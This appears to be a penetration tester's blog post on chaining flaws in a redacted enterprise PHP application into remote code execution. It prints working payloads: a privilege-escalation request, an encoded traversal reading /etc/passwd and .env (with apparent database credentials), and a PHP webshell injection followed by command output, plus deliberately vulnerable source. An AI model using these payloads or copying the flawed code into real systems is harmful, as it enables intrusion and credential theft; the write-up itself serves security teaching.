@@ -1,0 +1,194 @@
+title: 'Hacking an Enterprise App: When Strict Firewalls Meet Vulnerable Code, Chaining Multiple Vulnerabilities to RCE'
+date: '2026-04-24'
+tags: ['blackbox', 'rce', 'red teaming']
+draft: false
+summary: 'How a blackbox engagement on an enterprise infrastructure protected by strict firewalls led to Remote Code Execution (RCE). A story of chaining vulnerabilities: from Information Disclosure and Credential Stuffing to Privilege Escalation via BAC, Arbitrary File Read, and Arbitrary File Write.'
+---
+
+# Hacking an Enterprise App: When Strict Firewalls Meet Vulnerable Code, Chaining Multiple Vulnerabilities to RCE
+
+As a penetration tester, we often face targets that look like impenetrable fortresses from the outside. Strict firewalls, aggressive Web Application Firewalls (WAF), and hidden ports are our daily bread and butter. However, robust perimeter security does not always equate to strong application-level security.
+
+In a recent blackbox engagement for a massive enterprise company (`app.redacted.com`), I proved that behind heavy-duty firewalls, an application built with careless native PHP can become a superhighway to total internal compromise (RCE).
+
+This post isn't just about finding bugs; it's about the hacker mindset required to chain small, seemingly low-impact vulnerabilities to gain root-level access. This is where the line between a standard bug hunter and an advanced attacker is drawn.
+
+---
+
+## Stage 1: The Outer Fortress and "Port Scrambling"
+
+The first step always begins with recon. When I attempted a port scan using Nmap against the target IP (`182.253.x.x`), I was immediately greeted with bizarre behavior.
+
+```bash
+~ ❯ nmap -p- 182.253.x.x -v  
+Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-04-23 16:25 +0700
+...
+Discovered open port 1025/tcp
+Discovered open port 256/tcp
+Discovered open port 80/tcp
+Discovered open port 1723/tcp
+Discovered open port 5900/tcp
+... (and dozens of other random ports)
+````
+
+**Technical Insight:** Scanning results that display a massive amount of random open ports (port scrambling/tarpitting) are a hallmark of enterprise hardware firewalls like **Fortinet**, or WAFs configured to confuse automated scanners. This makes common injection attacks (like automated SQLi) incredibly difficult because connections are often dropped randomly.
+
+I initially tried Host Header Injection on the application's Magic Link feature to hijack an admin account, but the WAF immediately blocked the redirection attempts. I had to look for weaknesses elsewhere: *Logical Flaws*.
+
+-----
+
+## Stage 2: The First Crack (Role Enumeration)
+
+I shifted my focus to the Registration feature. At first glance, the application's interface looked very modern. However, when I tried to register an email that already existed, the application responded with an overly descriptive error: **the system leaked the role of that specific email**.
+
+Armed with a bit of OSINT on LinkedIn to figure out the company's email format, I wrote a simple PoC script. The result? I could distinguish which emails were unregistered, which belonged to regular users, and which belonged to employees/admins.
+
+-----
+
+## Stage 3: Client-Side Source Code & Privilege Escalation (BAC)
+
+Following the normal flow, I registered as a standard user. Upon logging in, I was faced with a dashboard that was... entirely empty. No menus, no features. A dead end? Absolutely not.
+
+For beginner bug hunters, this might be the stopping point. However, by performing Client-Side Source Code Analysis on the JavaScript files loaded by the browser, I discovered a goldmine of hidden API endpoints used by Administrators.
+
+The majority of these endpoints responded with a `403 Forbidden` (meaning server-side validation was working properly). However, one specific endpoint caught my eye: `/index.php?action=update_user_config_ajax`.
+
+This endpoint didn't reject my request; instead, it threw an `insufficient parameters` error. By analyzing requests from other features (like the password reset function), I managed to piece together the required parameters: `user_id`, `email`, `system_role`, `primary_role`, and `isactivate`.
+
+Assuming that `system_role` accepted an integer data type, I changed its value to `1` (assuming 1 equals Admin) and fired off the request:
+
+```http
+POST /index.php?action=update_user_config_ajax HTTP/2
+Host: app.redacted.com
+...
+user_id=1024&email=hacker@redacted.com&system_role=1&primary_role=0&isactivate=1
+```
+
+**BOOM.** My previously empty user account was instantly elevated to **Full Administrator**.
+
+> **Side Finding (Policy Misconfiguration & Credential Stuffing):** \> While inspecting the response from the password reset feature earlier, I noticed the system recommended a standard password format to its users: `CompanyName-Year-SpecialCharacter` (e.g., `Redacted-2026!`).
+>
+> Recognizing this as an exploitable pattern, I connected the dots. Armed with the list of valid employee emails I had gathered during the role enumeration stage, I decided to launch a **Credential Stuffing** (or more accurately, Password Spraying) attack. I sprayed this exact password pattern against the entire list of emails on the login page.
+>
+> The results were staggering: roughly 4 out of 10 (40%) users were actually using the recommended password and had never changed it\! A system policy originally intended to "guide" users into creating strong passwords had become a massive security risk, facilitating mass account compromise without ever needing to touch the database.
+
+-----
+
+## Stage 4: From Admin to LFI and Source Code Retrieval
+
+As an Admin, the attack surface blew wide open. I found a "Proxy" feature that allowed admins to hijack subordinate user sessions, alongside several Stored XSS vulnerabilities. But I wanted total control.
+
+I analyzed a feature called *Load Module*. I noticed a strange GET request taking a file parameter:
+`GET /index.php?action=load_vendor&file=...`
+
+Initial attempts to perform Directory Traversal (`../../../etc/passwd`) were swiftly blocked by the WAF. However, by using double URL Encoding (`%2f`), I successfully bypassed the WAF and triggered a **Local File Inclusion (LFI)**\!
+
+```http
+GET /index.php?action=load_vendor&file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/2
+Host: app.redacted.com
+```
+
+The server responded with the contents of `/etc/passwd`. From here, I extracted the `.env` file and read the hidden SQL Server database credentials.
+
+```env
+export DB_USER=sys.pub_app
+export DB_PASS=72ZUL4m79dKK
+```
+
+I also used this LFI to read `/proc/net/arp` and `/proc/net/tcp`, which confirmed that this production app was sitting deep inside the internal network (`172.20.240.x`), behind a strict proxy.
+
+**LFI Pro-Tip (Using CWD):** Because I didn't know the absolute path of the application's webroot, I tried reading the Apache configuration. When direct path reading failed, I utilized the `/proc/self/cwd/` (Current Working Directory) trick to reference the folder where the executing PHP script resided:
+`file=..%2f..%2f..%2fproc%2fself%2fcwd%2fprocess%2fload_vendor.php`
+
+This allowed me to read the actual source code of the vulnerable endpoint:
+
+```php
+// File: src/process/load_vendor.php
+$file = $_GET['file'] ?? '';
+$filePath = __DIR__ . "/../vendor/" . $file;
+
+if (!empty($file) && file_exists($filePath)) {
+    header('Content-Type: application/javascript');
+    readfile($filePath);
+    exit;
+}
+```
+
+> *Insight:* The developers assumed that prepending the directory `__DIR__ . "/../vendor/"` would make it secure. However, they forgot to sanitize the `$file` variable from `../` characters, making this LFI attack incredibly smooth.
+
+-----
+
+## Stage 5: The Final Blow (Arbitrary File Write to RCE)
+
+With the ability to read the source code via LFI, I started hunting for a Remote Code Execution (RCE) vector. My eyes landed on the *Manage Module* feature, which allowed admins to create new folders/modules.
+
+Let's dissect the vulnerable PHP code:
+
+```php
+// --- MODULE CREATION LOGIC (PHYSICAL FOLDER & FILE) ---
+$rawName = $_POST['mod_name'];
+$icon = $_POST['mod_icon'] ?: 'fas fa-box';
+
+// 1. Folder name sanitization (Alphanumeric only)
+$folderName = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $rawName)); 
+$targetDir = __DIR__ . "/../modules/" . $folderName;
+
+if (!file_exists($targetDir)) { mkdir($targetDir, 0777, true); }
+
+$overviewFile = $targetDir . "/index.php";
+
+// 2. THE FATAL FILE WRITE FLAW
+if (!file_exists($overviewFile)) {
+    file_put_contents($overviewFile, "<h3>Welcome to $rawName</h3><p>Halaman ini dibuat otomatis.</p>");
+}
+```
+
+**Vulnerability Anatomy:**
+The developers felt secure because the folder name (`$folderName`) was sanitized using `preg_replace` (stripping all special characters).
+**BUT**, when creating the contents of the `index.php` file using `file_put_contents()`, the developers inserted the raw, unsanitized `$rawName` variable directly into the PHP string\!
+
+I immediately fired off my payload via HTTP POST:
+
+```http
+POST /manage-module HTTP/2
+...
+mod_name=Dashboard+<%3fphp+system($_GET['cmd'])%3b+%3f>&mod_icon=fas+fa-box
+```
+
+What happened in the backend?
+
+1.  `$folderName` became `dashboardphpsystemgetcmd` (Characters like `<, ?, _, [, ], ', ;` were stripped). The folder was created.
+2.  The `index.php` file was generated, and because `$rawName` was unfiltered, its content became:
+    `<h3>Welcome to Dashboard <?php system($_GET['cmd']); ?></h3>...`
+
+Perfect. My PHP payload was injected flawlessly. The final step was simply to call the webshell:
+
+`GET /modules/dashboardphpsystemgetcmd/index.php?cmd=ls%20-lah`
+
+**The Response:**
+
+```text
+<h3>Welcome to Dashboard total 196K
+drwxrwxr-x+ 6 administrator www-data 4,0K Apr 21 08:43 .
+-rwxrwxr-x+ 1 administrator www-data 7,2K Apr 21 08:47 index.php
+-rwxrwxr-x+ 1 administrator www-data  25K Apr 21 16:19 manage-module.php
+-rw-rw-r--+ 1 webdev        www-data  12K Apr 21 12:01 manage-users.php
+drwxrwxr-x+ 2 administrator www-data 4,0K Apr 21 08:34 mobile
+</h3><p>Halaman ini dibuat otomatis.</p>
+```
+
+The system was completely compromised. RCE achieved.
+
+-----
+
+## Conclusion
+
+An expensive firewall only serves as an outer defensive wall. In this scenario, a long chain consisting of:
+
+1.  Lack of enumeration protection
+2.  Weak password policies leading to Credential Stuffing
+3.  Over-reliance on client-side logic (Broken Access Control)
+4.  Insufficient input sanitization leading to File Read Vulnerability
+5.  A fatal logic flaw involving PHP variables in a file write function
+
+...caused this enterprise application to crumble. This proves that *defense-in-depth* is meaningless if the root of the application code itself (native PHP in this case) is fragile and not modeled against the correct threat scenarios.
